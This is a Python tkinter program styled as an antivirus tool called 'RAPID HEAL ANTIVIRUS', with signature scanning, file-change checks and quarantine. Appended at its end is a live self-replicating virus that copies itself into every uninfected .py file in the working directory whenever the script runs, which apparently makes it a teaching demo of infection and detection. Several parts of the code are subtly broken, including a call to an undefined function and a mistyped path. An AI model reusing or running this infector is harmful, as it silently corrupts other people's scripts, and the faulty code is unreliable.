from threading import *
from tkinter import *
from tkinter.filedialog import askopenfilename
from tkinter.messagebox import showerror
import tkinter, tkinter.scrolledtext
import re,csv
import threading
import os
import sys
import urllib.request
import glob
import time
import hashlib
import socket
import subprocess
#self-made
import quarantaene
import SystemFileScanner
os_name = sys.platform
verzeichnisse = []
files = []
partitionen = []
terminations = []
if "win" in os_name:
    if not os.path.exists("AntiVirus\\Quarantine\\"):
        os.makedirs("AntiVirus\\Quarantine\\")
    if not os.path.exists("AntiVirus\\sf\\"):
        os.makedirs("AntiVirus\\sf\\")
    if not os.path.exists("AntiVirus\\Large_Update_File\\"):
        os.makedirs("AntiVirus\\Large_Update_File")
    quarantine_folder = "AntiVirus\\Quarantine\\*"
    file_to_quarantine = "AntiVirus\\Quarantine\\"
    partitionen_folder = "AntiVirus\\sf\\sf.txt"
    links_current = "AntiVirus\\Large_Update_File\\links_current.txt"
    links_downloaded = "AntiVirus\\Large_Update_File\\links_downloaded.txt"
    large_signatures = "AntiVirus\\Large_Update_File\\signatures.txt"
    f = open(partitionen_folder, "a")
    f.close()
    f = open(links_current, "a")
    f.close()
    f = open(links_downloaded, "a")
    f.close()
    f = open(large_signatures, "a")
    f.close()
else:
    if not os.path.exists("AntiVirus//Quarantine//"):
        os.makedirs("AntiVirus//Quarantine//")
    if not os.path.exists("AntiVirus//sf//"):
        os.makedirs("AntiVirus//sf//")
    if not os.path.exists("AntiVirus//Large_Update_File//"):
        os.makedirs("AntiVirus//Large_Update_File//")
    quarantine_folder = "AntiVirus//Quarantine//*"
    file_to_quarantine = "AntiVirus//Quarantine//"
    partitionen_folder = "AntiVirus//sf//sf.txt"
    links_current = "AntiVirus//Large_Update_File//links_current.txt"
    links_downloaded = "AntiVirus//Large_Update_File//links_downloaded.txt"
    large_signatures = "AntiVirus//arge_Update_File//signatures.txt"
    f = open(partitionen_folder, "a")
    f.close()
    f = open(links_current, "a")
    f.close()
    f = open(links_downloaded, "a")
    f.close()
    f = open(large_signatures, "a")
    f.close()
files_len = counter = 0
main = None
update_button = None
scan_button = None
fullscan_button = None
quit_button = None
b_delete = None
b_delete_all = None
b_restore = None
b_restore_all = None
b_add_file = None
text_box = None
e = None
li = None
rb1 = None
rb2 = None
method = None
bgc = None
fgc = None
special = None
special_text = None
t_time = None
daytime = int(time.strftime("%H", time.localtime()))
#Adjusting the brightness for the current day_time
#It's totally unnecessary but I wanted to play around a little
if daytime >= 18 or daytime <= 4:
    bgc = "black"
    fgc = "white"
    special = "brown"
    special_text = "（°_°）☽ ☆ Good evening " + os.getlogin() + " ☆ ☾（°_°）\n"
elif daytime > 4 and daytime <= 8:
    special_text = "＼(o￣∇￣o)/ Good morning " + os.getlogin() + " ＼(o￣∇￣o)/\n"
    bgc = "#b4d60c"
    fgc = "black"
    special = "orange"
else:
    bgc = "white"
    fgc = "black"
    special = "#1ccaed"
    special_text = ":) Welcome to RAPID HEAL ANTIVIRUS " + os.getlogin() + " (:\n"
def clock_thread():
    global e
    months = ["January", "February", "March", "April", "May", "June", "Juli", "August", "September", "October", "November", "December"]
    while True:
        string_time = "%H:%M:%S o'clock, on %d.{0}.%Y"
        month_name = time.strftime("%B", time.localtime())
        for i in range(len(months)):
            if months[i] == month_name:
                month_name = str(i+1)
                if int(month_name) < 10:
                    month_name = "0" + month_name
                break
        string_time = string_time.format(month_name)
        current_time = time.strftime(string_time, time.localtime())
        e.delete(0, len(e.get()))
        e.update()
        e.insert(0, current_time)
        e.update()
        time.sleep(1)
        
def ScanSystemFiles():
    global files
    global text_box
    global files_len
    text_box.insert(END, "[ * ] Scanning system for files...\n")
    text_box.see(END)
    text_box.update()
    time.sleep(3)
    text_box.see(END)
    text_box.update()
    SystemFileScanner.partitions(partitionen_folder)
    f = open(partitionen_folder, "r")
    content = f.read()
    f.close()
    content = content.splitlines()
    files = content
    files_len = len(files)
    text_box.insert(END, "[ + ] System successfully prepared\n", 'positive')
    text_box.tag_config("positive", foreground="green")
    text_box.see(END)
    text_box.update()
    
def getFileData():
    # get an intial scan of file size and data modified. save
    programs = glob.glob("*.py")
    programList=[]
    for p in programs:
        programSize= os.path.getsize(p)
        programModified= os.path.getmtime(p)
        programData=[p,programSize,programModified]
        programList.append(programData)
    return programList

def WriteFileData(programs):
    if os.path.exists("fileData.txt"):
        return
    with open("fileData.txt","w") as file:
        wr=csv.writer(file)
        wr.writerows(programs)
        
def full_scan():
    global verzeichnisse
    global files
    global text_box
    global e
    global full_scan
    global files_len
    global lock
    global t_time
    global counter
    text_box.insert(END,"\n\n###### check for heuristic changes in files ######\n")
    # open the fileData.txt file and compare each line
    # to the current file size and dates
    with open("fileData.txt") as file:
        fileList=file.read().splitlines()
        orginalFileList=[]
        for each in fileList:
            items = each.split(',')
            orginalFileList.append(items)
        # get current data from directory
    currentFileList=getFileData()
    #compare old and new
    for c in currentFileList:
        for o in orginalFileList:
            if(c[0]==o[0]): #filename matched
                if str(c[1])!=str(o[1]) or str(c[2])!=str(o[2]):
                    #filesize or date don't match
                    text_box.insert(END,"\nalert!!! File mismatch\n","important")
                    text_box.tag_config("important", foreground="red")
                    #print data of each file
                    text_box.insert(END,"\ncurrent values= "+str(c)+"\n", "important")
                    text_box.insert(END,"\norginal values= "+str(o)+"\n", "important")
                else:
                    text_box.insert(END,"\nfile "+c[0]+" appears to be unchanged\n", "positive")
                    
def quarantine():
    global text_box
    global terminations
    global li
    global b_delete
    global b_delete_all
    global b_restore
    global b_restore_all
    global b_add_file
    k = 0
    while True:
        tmp = len(li.get(k))
        if tmp == 0:
            break
        else:
            li.delete(0, tmp)
            k += 1
    li.update()
    
    terminations = glob.glob(quarantine_folder)
    if terminations == []:
        text_box.insert(END, "[ + ] No files in quarantine\n", "positive")
        text_box.tag_config('positive', foreground="green")
        text_box.see(END)
        text_box.update()
    else:
        text_box.insert(END, "[ + ] Files in quarantine:\n", "positive")
        text_box.tag_config('positive', foreground="green")
        text_box.see(END)
        text_box.update()
        for i in terminations:
            text_box.insert(END, "[ * ] " + i + "\n", "info")
            text_box.tag_config("info", background = "red")
            text_box.see(END)
            text_box.update()
            li.insert(END, i)
            li.update()
    b_delete_all["command"] =lambda:button_action_handler("delete_all")
    b_delete["command"] = lambda:button_action_handler("delete")
    b_restore["command"] = lambda:button_action_handler("restore")
    b_restore_all["command"] = lambda:button_action_handler("restore_all")
    b_add_file["command"] = lambda:button_action_handler("add_file")
    
def delete(file, ALL):#ALL = 1 => deletes all objects in quarantine
    global li
    global text_box
    global terminations
    if len(terminations) != 0:
        if ALL == 1:
            for i in range(len(terminations)):
                os.remove(terminations[i])
                text_box.insert(END, "[ + ] Deletion successful: \n" + terminations[i] + "\n", "positive")
                text_box.tag_config("positive", foreground="green")
                text_box.see(END)
                text_box.update()
                li.delete(0, len(terminations[i]))
                li.update()
        elif ALL == 0:
            os.remove(file)
            li.delete(ACTIVE, len(file))
            li.update()
            text_box.insert(END, "[ + ] Deletion successful:\n" + file + "\n", "positive")
            text_box.tag_config("positive", foreground="green")
            text_box.see(END)
            text_box.update()
            
        terminations = glob.glob(quarantine_folder)
        for i in terminations:
            li.insert(END, i)
        li.update()
    else:
        text_box.insert(END, "[ - ] Unable to locate any files\n", "negative")
        text_box.tag_config("negative", foreground="red")
        text_box.see(END)
        text_box.update()
        
def restore(file, ALL):
    global li
    global text_box
    global terminations
    if len(terminations) != 0:
        if ALL == 1:
            for i in range(len(terminations)):
                quarantaene.decode_base64(terminations[i])
                text_box.insert(END, "[ + ] Successfully restored\n" + terminations[i] + "\n", 'positive')
                text_box.tag_config('positive', foreground="green")
                text_box.see(END)
                text_box.update()
                li.delete(0, len(terminations[i]))
                li.update()
        elif ALL == 0:
            quarantaene.decode_base64(file)
            li.delete(ACTIVE, len(file))
            text_box.insert(END, "[ + ] Successfully restored\n" + file + "\n", "positive")
            text_box.tag_config("positive", foreground="green")
            text_box.see(END)
            text_box.update()
        terminations = glob.glob(quarantine_folder)
        for i in terminations:
            li.insert(END, i)
        li.update()
    else:
        text_box.insert(END, "[ - ] Unable to locate any files\n", "negative")
        text_box.tag_config("negative", foreground="red")
        text_box.see(END)
        text_box.update()
            
def add_file_to_quarantine():
    global li
    global terminations
    file = askopenfilename()
    file = file.replace("/", "\\")
    quarantaene.encode_base64(file, file_to_quarantine)
    text_box.insert(END, "[ + ] Moved to quarantine:\n" + file + "\n", "positive")
    text_box.tag_config("positive", foreground="green")
    text_box.see(END)
    text_box.update()
    li.update()
    k = 0
    while True:
        tmp = len(li.get(k))
        if tmp == 0:
            break
        else:
            li.delete(0, tmp)
            k += 1
    li.update()
    terminations = glob.glob(quarantine_folder)
    for i in terminations:
        li.insert(END, i)
        li.update()
        
def scan():
    global text_box
#signature scan
#scan for signatures just like semantic or other virus software
#def checkForSignatures():
#get all programs in the directory
    programs = glob.glob("*.py")
    for p in programs:
        thisFileInfected=False
        file = open(p,"r")
        lines = file.readlines()
        file.close()
        for line in lines:
            if(re.search("^#starting virus code",line)):
                # found virus
                text_box.insert(END,"\n!!!! virus found in file "+p+"\n", "important")
                text_box.see(END)
                text_box.update()
                thisFileInfected = True
        if (thisFileInfected == False):
            text_box.insert(END,p+" has no virus\n", "positive")
            text_box.see(END)
            text_box.update()
        print(END,"\n#### end section ####\n", "positive")
        text_box.see(END)
        text_box.update()
        
def create_md5(content):
    md = hashlib.md5()
    md.update(content)
    return bytes(md.hexdigest(), "utf-8")

def closing():
    main.destroy()
    sys.exit()
    
def button_action_handler(s):
    global files_len
    global text_box
    global t_time
    global fullscan_button
    global b_delete
    global b_delete_all
    global b_restore
    global b_restore_all
    global b_add_file
    global li
    global rb1
    global rb2
    global method
    if s == "rb1":
        method = 1
        rb1.place_forget()
        rb2.place_forget()
    if s == "rb2":
        method = 2
        rb2.place_forget()
        rb1.place_forget()
    if s == "delete":
        tb = Thread(target=delete, args=(li.get(ACTIVE),0))
        tb.start()
    if s == "delete_all":
        tb = Thread(target=delete, args=(0,1))
        tb.start()
    if s == "restore":
        tb = Thread(target=restore, args=(li.get(ACTIVE),0))
        tb.start()
    if s == "restore_all":
        tb = Thread(target=restore, args=(0,1))
        tb.start()
    if s == "add_file":
        tb = Thread(target=add_file_to_quarantine)
        tb.start()
    #if s == "update_button":
        tb = Thread(target=link_collector)
        tb.start()
    if s == "scan_button":
        tb = Thread(target=scan)
        tb.start()
    if s == "fullscan_button":
        if files_len == 0:
            text_box.insert(END, "[ ! ] Preparing program\n It will take more time to load", "important")
            text_box.see(END)
            text_box.update()
            WriteFileData(getFileData())
            full_scan()
        elif files_len < len(files):
            text_box.insert(END, "[ ! ] One scan is already in action\n", "important")
            text_box.see(END)
            text_box.update()
        else:
            fullscan_button["state"] = "disabled"
            t_time = time.time()
            text_box.insert(END, "[ ! ] Got {0} files to scan\n".format(files_len), 'important')
            text_box.tag_config("important", foreground="red")
            text_box.update()
            text_box.insert(END, "[ * ] Scan might last for hours...\n")
            text_box.see(END)
            text_box.update()
            tb1 = Thread(target=full_scan, args=(1,))
            tb1.start()
            time.sleep(1)
            tb2 = Thread(target=full_scan, args=(2,))
            tb2.start()
            time.sleep(1)
            tb3 = Thread(target=full_scan, args=(3,))
            tb3.start()
            time.sleep(1)
            tb4 = Thread(target=full_scan, args=(4,))
            tb4.start()
            time.sleep(1)
            tb5 = Thread(target=full_scan, args=(5,))
            tb5.start()
            time.sleep(1)
            tb6 = Thread(target=full_scan, args=(6,))
            tb6.start()
            time.sleep(1)
            tb7 = Thread(target=full_scan, args=(7,))
            tb7.start()
            time.sleep(1)
            tb8 = Thread(target=full_scan, args=(8,))
            tb8.start()
    if s == "quarantine_button":
        if li.winfo_viewable() == 0:
            b_delete.place(x = 570, y = 70)
            b_delete_all.place(x = 570, y = 95)
            b_restore.place(x = 570, y = 120)
            b_restore_all.place(x = 570, y = 145)
            b_add_file.place(x = 570, y = 170)
            li.place(x = 570, y = 18.5)
            tb = Thread(target=quarantine)
            tb.start()
        if li.winfo_viewable() == 1:
            b_delete.place_forget()
            b_delete_all.place_forget()
            b_restore.place_forget()
            b_restore_all.place_forget()
            b_add_file.place_forget()
            li.place_forget()
    if s == "quit_button":
        tb = Thread(target=closing)
        tb.start()
        
def gui_thread():
    global main
    global update_button
    global scan_button
    global fullscan_button
    global quit_button
    global text_box
    global e
    global files_len
    global files
    global li
    global b_delete
    global b_delete_all
    global b_restore
    global b_restore_all
    global b_add_file
    global rb1
    global rb2
    global method
    global bgc
    global fgc
    global special_text
    main = tkinter.Tk()
    main.title("AntiVirus")
    main.wm_iconbitmap("")
    main.configure(bg=bgc)
    main.geometry("750x205")#width x height
    main.resizable(False, False)
    #main.overrideredirect(1)
    hoehe = 2
    breite = 20
    #Buttons
    update_button = tkinter.Button(main, bg=bgc, fg=fgc, text = "OPTIONS", command=lambda:button_action_handler("update_button"), height = hoehe, width = breite)
    update_button.grid(row = 0, column = 0)
    scan_button = tkinter.Button(main, bg=bgc, fg=fgc, text = "Signature Scan", command=lambda:button_action_handler("scan_button"), height = hoehe, width = breite)
    scan_button.grid(row = 1, column = 0)
    fullscan_button = tkinter.Button(main, bg=bgc, fg=fgc, text = "Heuristic scan", command=lambda:button_action_handler("fullscan_button"), height = hoehe, width = breite)
    fullscan_button.grid(row = 2, column = 0)
    quarantine_button = tkinter.Button(main, bg=bgc, fg=fgc, text = "Quarantine", command=lambda:button_action_handler("quarantine_button"), height = hoehe, width = breite)
    quarantine_button.grid(row = 3, column = 0)
    quit_button = tkinter.Button(main, bg=bgc, fg=fgc, text = "Close", command=lambda:button_action_handler("quit_button"), height = hoehe, width = breite)
    quit_button.grid(row = 4, column = 0, sticky="w")
    b_delete = tkinter.Button(main, bg=bgc, fg=fgc, text = "Remove current", height=0, width = 25, justify=CENTER)
    b_delete_all = tkinter.Button(main, bg=bgc, fg=fgc, text = "Remove all", height = 0, width = 25, justify=CENTER)
    b_restore = tkinter.Button(main, bg=bgc, fg=fgc, text = "Restore current", height=0, width = 25, justify=CENTER)
    b_restore_all = tkinter.Button(main, bg=bgc, fg=fgc, text = "Restore all", height = 0, width = 25, justify=CENTER)
    b_add_file = tkinter.Button(main, bg=bgc, fg=fgc, text = "Add file", height = 0, width = 25, justify=CENTER)
    b_delete.place(x = 570, y = 70)
    b_delete_all.place(x = 570, y = 95)
    b_restore.place(x = 570, y = 120)
    b_restore_all.place(x = 570, y = 145)
    b_add_file.place(x = 570, y = 170)
    b_delete.place_forget()
    b_delete_all.place_forget()
    b_restore.place_forget()
    b_restore_all.place_forget()
    b_add_file.place_forget()
    #Text
    text_box = tkinter.scrolledtext.ScrolledText(main)
    text_box.configure(bg=bgc)
    text_box.configure(fg=fgc)
    text_box.place(height = 205, width = 419,x = 150, y = 0)
    #Listbox
    li = tkinter.Listbox(main, height=3, width = 29)
    li.place(x = 570, y = 18.5)
    li.place_forget()
    #Entries
    e = tkinter.Entry(main,width = 30)
    e.place(x = 570, y = 0)
    e["justify"] = CENTER
    e.insert(0, "")
    e["bg"] = bgc
    e["fg"] = fgc
    #Intro
    text_box.insert(END, special_text, "VIP")
    text_box.tag_config("VIP", background=special)
    text_box.insert(END, "[ + ] Preparing the program\n", 'positive')
    text_box.tag_config('positive', foreground='green')
    text_box.see(END)
    text_box.update()
    text_box.insert(END, "[ ! ] You might have to wait for a bit\n", 'important')
    text_box.tag_config('important', foreground="red")
    text_box.see(END)
    text_box.update()
    #row_counter += 3
    main.mainloop()
    
#Executing Threads
t_main = Thread(target=gui_thread)# Main Thread
t_files = Thread(target=ScanSystemFiles)
t_clock = Thread(target=clock_thread)
t_main.start()
time.sleep(1)
t_clock.start()
time.sleep(5)
#print(t_main.isAlive())
t_files.start()
#starting virus code

import sys,re,glob

#put a copy of all these lines into a list

virusCode =[]

#open this file and read all lines
#filter out all lines that are not inside the virus code boundary
thisFile=sys.argv[0]
virusFile=open(thisFile,"r")
lines=virusFile.readlines()
virusFile.close()
#save the lines into a list to use later
inVirus= False

for line in lines:
    
    if(re.search("^#starting virus code",line)):
        inVirus=True
    
    #if the virus code has been found, start appending the
    #lines to the virusCode list. We assume that the virus
    #code is always appended to the end of the script.
    
    if(inVirus==True):
        virusCode.append(line)
    if(re.search("^#end of virus code",line)):
        break
    
#find potential victims
programs = glob.glob("*.py")
#check and infect all programs that glob found
for p in programs:
    file = open(p,"r")
    programCode= file.readlines()
    file.close()
    #check if the file is already infected
    infected= False
    for line in programCode:
        if(re.search("^#starting virus code", line)):
            infected= True
            break
    #no need to infect it again.
    if not infected:
        newCode= []
        #newVersion = current version + virus code
        newCode = programCode
        newCode.extend(virusCode)
        #new version of file. overwrite the original
        file = open(p,"w")
        file.writelines(newCode)
        file.close()
        
#payload-print file is infected
print("This file is infected")
#end of virus code
